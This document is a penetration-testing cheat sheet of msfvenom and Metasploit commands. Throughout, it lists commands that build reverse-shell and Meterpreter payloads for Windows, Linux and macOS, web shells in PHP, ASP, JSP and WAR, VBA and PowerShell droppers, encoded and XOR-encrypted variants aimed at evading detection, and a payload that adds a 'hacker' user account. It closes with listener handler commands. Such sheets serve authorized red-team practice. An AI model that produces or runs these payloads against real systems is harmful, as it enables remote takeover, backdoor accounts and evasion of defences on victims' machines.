# msfvenom

% msfvenom, reverse shell

#plateform/linux #target/local #cat/ATTACK/REVERSE_SHELL 

## msfvenom - List available payloads
```
msfvenom --list-options payload
```

## msfvenom - Windows x86 Meterpreter Reverse TCP (unstaged)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe -o shell.exe
```

## msfvenom - Linux x86 Meterpreter Reverse TCP
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf
```

## msfvenom - Linux x64 Meterpreter Reverse TCP
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip|tun0> LPORT=<port> PrependFork=true -f elf -o test.elf
```

## msfvenom - Windows Meterpreter Reverse TCP (staged)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
```

## msfvenom - Windows Shell Reverse TCP
```
msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<local> -f exe -o shell.exe
```

## msfvenom - Windows Meterpreter Reverse TCP (encoded)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<local> -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe
```

## msfvenom - macOS x86 Shell Reverse TCP
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f macho -o shell.macho
```

## msfvenom - Windows x64 Meterpreter Reverse HTTPS (non-staged)
```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=<port|443> -f exe -o /var/www/html/msfnonstaged.exe
```

## msfvenom - Windows x64 Meterpreter Reverse HTTPS (staged)
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f exe -o /var/www/html/msfstaged.exe
```

## Web Payloads

## msfvenom - PHP Meterpreter Reverse TCP
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.php
```

## msfvenom - ASP Meterpreter Reverse TCP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o shell.asp
```

## msfvenom - JSP Java Meterpreter Reverse TCP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.jsp
```

## msfvenom - WAR Payload
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
```

## msfvenom - VBA 32-bit Meterpreter Reverse HTTPS
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f vba -o shell.vba
```

## msfvenom - PowerShell 32-bit Meterpreter Reverse HTTPS
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f psh -o shell.ps1
```

## msfvenom - DLL Payload (Windows x64 Meterpreter Reverse HTTPS)
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f dll -o output.dll
```

# Scripting Payloads

## msfvenom - Python Reverse Shell
```
msfvenom -p cmd/unix/reverse_python LHOST=<ip> LPORT=<port> -f raw -o shell.py
```

## msfvenom - Bash Unix Reverse Shell
```
msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw -o shell.sh
```

## msfvenom - Perl Unix Reverse Shell
```
msfvenom -p cmd/unix/reverse_perl LHOST=<ip> LPORT=<port> -f raw -o shell.pl
```

## msfvenom - PowerShell Reverse HTTPS
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f ps1 -o shell.ps1
```

## msfvenom - Csharp (xor encrypted)
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> --encrypt xor --encrypt-key <key> -f csharp -o shell.cs
```

# msfvenom Shellcode

## msfvenom - Windows Meterpreter Reverse TCP Shellcode
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language> -o shellcode.<ext>
```

## msfvenom - Linux Meterpreter Reverse TCP Shellcode
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language> -o shellcode.<ext>
```

## msfvenom - macOS Reverse TCP Shellcode
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f <language> -o shellcode.<ext>
```

# msfvenom - Create User Payload

## msfvenom - Windows Add User Payload
```
msfvenom -p windows/adduser USER=<user|hacker> PASS='<pass|Hacker123$>' -f exe -o adduser.exe
```

# Metasploit Handler

## Metasploit Handler - Windows TCP 32-bit (staged)
```
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port>; set payload windows/meterpreter/reverse_tcp; exploit"
```

## Metasploit Handler - Windows HTTPS 32-bit (staged)
```
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/meterpreter/reverse_https; set EXITFUNC thread; exploit"
```

## Metasploit Handler - Windows HTTPS 64-bit (staged)
```
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; exploit"
```

## Metasploit Handler - Windows HTTPS 64-bit (unstaged)
```
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter_reverse_https; exploit"
```

## Metasploit Handler - Windows HTTPS 64-bit (staged, encoded xor)
```
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder <encoder|x64/xor_dynamic>; exploit"
```

## Metasploit Handler - Linux TCP 64-bit (staged, encoded xor)
```
msfconsole -x "use exploits/multi/handler; set lhost <ip|tun0>; set lport <lport|443>; set payload linux/x64/meterpreter/reverse_tcp; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit"
```